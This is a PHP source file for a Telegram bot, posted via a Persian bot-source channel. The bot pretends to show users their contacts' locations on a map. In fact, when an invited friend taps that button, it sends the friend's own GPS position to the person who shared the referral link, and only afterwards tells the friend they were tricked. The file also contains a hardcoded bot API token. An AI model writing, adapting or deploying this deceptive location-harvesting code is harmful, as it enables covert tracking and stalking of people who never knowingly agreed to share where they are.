<?php
/*
کانال سورس خونه ! پر از سورس هاي ربات هاي تلگرامي !
لطفا در کانال ما عضو شويد 
@source_home
https://t.me/source_home
*/
$API_KEY = '1623028043:AAGGCA7NKH_Je03XRQbe4gcP6Q4psb-WgKA'; # -- Token -- #
$bot_id = '@KingMovieFileBot'; # -- Bot UserName -- #
$channel = 'hslu78tvhos254'; # -- Channel iD -- #
$admin1 = '710732845'; # -- Admin -- #
$admin2 = '710732845'; # -- Admin -- #
define('API_KEY', $API_KEY);
$admins = array($admin1,$admin2);
function bot($method, $datas = []){
    $url = "https://api.telegram.org/bot" . API_KEY . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {
        var_dump(curl_error($ch));
    } else {
        return json_decode($res);
}}
function SendMessage($chat_id, $text, $key){
bot('sendMessage', ['chat_id' => $chat_id,'text' => $text,'parse_mode' => 'Html','disable_web_page_preview' => true,'reply_markup' => $key]);}
function Forward($chat_id,$from_id,$massege_id){
bot('ForwardMessage',['chat_id'=>$chat_id,'from_chat_id'=>$from_id,'message_id'=>$massege_id]);}
$button_location = json_encode(['keyboard' => [[['text' => '📌دریافت موقعیت مخاطبین روی نقشه','request_location' => true]]],'resize_keyboard' => true]);
$button_official = json_encode(['keyboard' => [[['text' => '🎖 دریافت لینک شخصی']],[['text' => '🔖 درباره ربات']]],'resize_keyboard' => true]);
$button_admin = json_encode(['keyboard' => [[['text' => 'امار']],[['text' => 'پیام همگانی'],['text' => 'فروارد همگانی']]],'resize_keyboard' => true]);
$button_back = json_encode(['keyboard' => [[['text' => 'بازگشت']]],'resize_keyboard' => true]);
# -----
$update = json_decode(file_get_contents('php://input'));
$text = $update->message->text;
$chat_id = $update->message->chat->id;
$message_id = $update->message->message_id;
$first_name = $update->message->from->first_name;
$chatid = $update->callback_query->message->chat->id;
$first_name2 = $update->callback_query->from->first_name;
$data = $update->callback_query->data;
$members = file_get_contents('member.txt');
$memlist = explode("\n", $members);
$truechannel = json_decode(file_get_contents('https://api.telegram.org/bot'.API_KEY."/getChatMember?chat_id=@$channel&user_id=".$chat_id));
$tch = $truechannel->result->status;
$truechannel2 = json_decode(file_get_contents('https://api.telegram.org/bot'.API_KEY."/getChatMember?chat_id=@$channel&user_id=".$chatid));
$tch2 = $truechannel2->result->status;
# -- Start -- #
if($text == '/start'){
	if($tch == 'left'){
		SendMessage($chat_id,"ربات 'مکان یاب هوشمند' ، به شکل کاملا انحصاری فقط برای اعضای کانال کُدینو طراحی شده ، برای استفاده از ربات ، ابتدا در کانال عضو شوید 👇🏻

▫️ @$channel  ▫️ @$channel  
▫️ @$channel   ▫️ @$channel 

👇🏻 بعد از عضو شدن دکمه زیر رو لمس کنید 👇🏻",json_encode(['inline_keyboard' => [[['text' => 'من عضو شدم','callback_data' => 'ozv']]]]));
	}else{
		SendMessage($chat_id,"سلام $first_name عزیز🌹

📍کی کجاس یک ربات بی نظیر برای پیدا کردن مکان دوستان شما روی نقشه ست😜👍.

📍کافیه ربات رو استارت کنی و روی دکمه ی '🎖دریافت لینک شخصی ' بزنی

📍بعد بنری رو که ربات بهت میده برای دوستات بفرستی  منتظر بشی تا وارد ربات بشن

📍به محض اینکه هرکدوم از دوستات روی دکمه ی '📌دریافت موقعیت مخاطبین روی نقشه' بزنن😛

ربات موقعیت مکانیش رو برات ارسال میکنه😂

🔸وقت اون رسیده تست کنیم آیا دوستامون راس میگن رفتن کیش و آنتالیا و مالزی و ...؟😂",$button_official);
	}
	if (!in_array($chat_id,$memlist)){
		mkdir("data/$chat_id");
        $members .= $chat_id."\n";
        file_put_contents("member.txt","$members");
	}
}
elseif(strpos($text,"/start") !== false){
	$id = str_replace("/start ","",$text);
	if($id != $chat_id){
		if($tch == 'left'){
		SendMessage($chat_id,"ربات 'مکان یاب هوشمند' ، به شکل کاملا انحصاری فقط برای اعضای کانال کُدینو طراحی شده ، برای استفاده از ربات ، ابتدا در کانال عضو شوید 👇🏻

▫️ @$channel  ▫️ @$channel  
▫️ @$channel   ▫️ @$channel 

👇🏻 بعد از عضو شدن دکمه زیر رو لمس کنید 👇🏻",json_encode(['inline_keyboard' => [[['text' => 'من عضو شدم','callback_data' => 'ozv2']]]]));
		}else{
			SendMessage($chat_id,"سلام $first_name عزیز🌹

روی دکمه ی 'دریافت موقعیت مخاطبین روی نقشه'  بزن و همین الان موقعیت همه مخاطبینت رو روی نقشه ببین.👇",$button_location);
		}
		SendMessage($id,"📌اطلاعیه

یک کاربر کاربر (  <a href='tg://user?id=$chat_id'>$first_name</a> ) با لینک شما وارد ربات شد.
به محض اینکه لوکیشن خود را با ربات به اشتراک بگذارد ان را بهع شما ارسال میکنیم ✅ ");
		if (!in_array($chat_id,$memlist)){
		mkdir("data/$chat_id");
        $members .= $chat_id."\n";
        file_put_contents("member.txt","$members");
		}
		file_put_contents('data/'.$chat_id.'/id.txt',$id);
	}else{
		SendMessage($chat_id,"خودت که دیگه میدونی خودت کجایی! چه کاریه آخه 😂😂😂",$button_official);
	}
}
elseif($update->message->location != null){
	$id = file_get_contents('data/'.$chat_id.'/id.txt');
	$longitude = $update->message->location->longitude;
	$latitude = $update->message->location->latitude;
	SendMessage($chat_id,"خب خب خب 👺😂 لو رفتی.

متاسفانه شما گول خوردی و ربات موقعیت فعلی شمارو برای کسی که به ربات دعوتت کرده بود ارسال کرد😂👍

اما خب حالا کاریه که شده 😉🌹

یه پیشنهاد دارم😍

همین حالا روی دکمه '🎖دریافت لینک شخصی' کلیک کن 

🎗بنر شخصی تو بگیر و اونو بفرس برای کسانی که دوس داری بدونی الان کجا هستن!🤣

بعدش ربات برای موقعیت اونارو میفرسته😎👍",$button_official);
	$mess = bot('sendLocation',[
	'chat_id' => $id,
	'longitude' => $longitude,
	'latitude' => $latitude])->result->message_id;
	bot('sendMessage',[
	'chat_id' => $id,
	'text' => "خب خب 😄
کاربر <a href='tg://user?id=$chat_id'>$first_name</a> موقعیت خودشو به اشتراک گزاشت 😶
اینم موقعیت الانش 👆👆👆👆",
	'parse_mode' => 'Html',
	'reply_to_message_id' => $mess]);
}
elseif($data == 'ozv'){
	if($tch2 != 'left'){
		bot('deletemessage',[
		'chat_id' => $chatid,
		'message_id' => $update->callback_query->message->message_id]);
	SendMessage($chatid,"سلام $first_name2 عزیز🌹

▫️کی کجاس یک ربات بی نظیر برای پیدا کردن مکان دوستان شما روی نقشه ست.😂👍

▫️کافیه ربات رو استارت کنی و روی دکمه ی 'دریافت لینک شخصی ' بزنی

▫️بعد بنری رو که ربات بهت میده برای دوستات بفرستی  منتظر بشی تا وارد ربات بشن

▫️به محض اینکه هرکدوم از دوستات روی دکمه ی '📌دریافت موقعیت مخاطبین روی نقشه' بزنن، ربات موقعیت مکانیش رو برات ارسال میکنه😁👍

🔸وقت اون رسیده تست کنیم آیا دوستامون راس میگن رفتن کیش و آنتالیا و مالزی و ...؟😂",$button_official);
	}else{
		SendMessage($chatid,"⚠️ شما هنوز در کانال @$channel عضو نشده اید!");
}}
elseif($data == 'ozv2'){
	if($tch2 != 'left'){
		bot('deletemessage',[
		'chat_id' => $chatid,
		'message_id' => $update->callback_query->message->message_id]);
		SendMessage($chatid,"سلام $first_name2 عزیز🌹

روی دکمه ی '📌دریافت موقعیت مخاطبین روی نقشه'
 بزن و همین الان موقعیت همه مخاطبینت رو روی نقشه ببین.🤪👇",$button_location);
	}else{
		SendMessage($chatid,"⚠️ شما هنوز در کانال @$channel عضو نشده اید!");
}}
elseif($tch == 'left'){
		SendMessage($chat_id,"ربات 'مکان یاب هوشمند' ، به شکل کاملا انحصاری فقط برای اعضای کانال کُدینو طراحی شده ، برای استفاده از ربات ، ابتدا در کانال عضو شوید 👇🏻

▫️ @$channel  ▫️ @$channel  
▫️ @$channel   ▫️ @$channel 

👇🏻 بعد از عضو شدن دکمه زیر رو لمس کنید 👇🏻",json_encode(['inline_keyboard' => [[['text' => 'من عضو شدم','callback_data' => 'ozv']]]]));
}
elseif($text == '🎖 دریافت لینک شخصی'){
	$mess = bot('sendPhoto',[
	'chat_id' => $chat_id,
	'photo' => new CURLFile('baner.jpg'),
	'caption' => "ربات هوشمند مکان یاب تلگرام😱

❗️آخرین موقعیت مخاطبینت رو آنلاین ببین😳

❗️وقتش رسیده بفهمی دوستات واقعا تعطیلات رو کجا رفتن؟😉
💯همین الان تا دیر نشده شروع کن 👇
t.me/$bot_id?start=$chat_id"])->result->message_id;
	bot('sendMessage',[
	'chat_id' => $chat_id,
	'text' => "این بنر رو برای تمام دوستانت که میخوای بفهمی الان کجا هستن فوروارد کن و منتظر باش تا وارد ربات بشن.

هرکس وارد ربات بشه ربات بهت خبر میده و بعد موقعیتش رو روی نقشه برات ارسال میکنه",
	'reply_to_message_id' => $mess]);
}
elseif($text == '🔖 درباره ربات'){
	SendMessage($chat_id,"کی کجاس چیست؟❓

▫️کی کجاس یک ربات بی نظیر برای پیدا کردن مکان دوستان شما روی نقشه ست.
▫️کافیه ربات رو استارت کنی و روی دکمه ی 'دریافت لینک شخصی ' بزنی
▫️بعد بنری رو که ربات بهت میده برای دوستات بفرستی  منتظر بشی تا وارد ربات بشن
▫️به محض اینکه هرکدوم از دوستات روی دکمه ی '📌دریافت موقعیت مخاطبین روی نقشه' بزنن، ربات موقعیت مکانیش رو برات ارسال میکنه

🔸وقت اون رسیده تست کنیم آیا دوستامون راس میگن رفتن کیش و آنتالیا و مالزی و ...؟😂",$button_official);
}
# -- Panel -- #
if(in_array($chat_id,$admins)){
    $command = file_get_contents("data/$chat_id/command.txt");	
	if($text == '/panel'){
	SendMessage($chat_id,"به پنل مدیریت خوش امدید",$button_admin);
	file_put_contents("data/$chat_id/command.txt","none");	
}
elseif($text == 'بازگشت'){
file_put_contents("data/$chat_id/command.txt","none");	
SendMessage($chat_id,"یک گزینه انتخاب کنید👇",$button_admin);
}
elseif($text == 'امار'){
    	$membersidd= explode("\n",$members);
		$mmemcount = count($membersidd) -1;
	SendMessage($chat_id,"👈 تعداد کل کاربران ربات: $mmemcount");
}
elseif($text == 'پیام همگانی'){
file_put_contents("data/$chat_id/command.txt","send");	
SendMessage($chat_id,"پیام خود را ارسال کنید",$button_back);
}
elseif($command == 'send'){
	file_put_contents("data/$chat_id/command.txt","none");
$forp = fopen( "member.txt", 'r'); 
while( !feof( $forp)) { 
$All = fgets( $forp); 
	SendMessage($All,$text,$button_official);
}
	SendMessage($chat_id,"ارسال شد",$button_admin);	
}
elseif($text == 'فروارد همگانی'){
	file_put_contents("data/$chat_id/command.txt","fwd");
SendMessage($chat_id,"پیام خود را ارسال کنید",$button_back);	
}
elseif($command == 'fwd'){
	file_put_contents("data/$chat_id/command.txt","none");
$forp = fopen("member.txt", 'r'); 
while( !feof( $forp)) { 
$fakar = fgets( $forp); 
	Forward($fakar,$chat_id,$message_id);
}
SendMessage($chat_id,"ارسال شد",$button_admin);	
}
}
unlink('error_log');
/*
کانال سورس خونه ! پر از سورس هاي ربات هاي تلگرامي !
لطفا در کانال ما عضو شويد 
@source_home
https://t.me/source_home
*/
?>
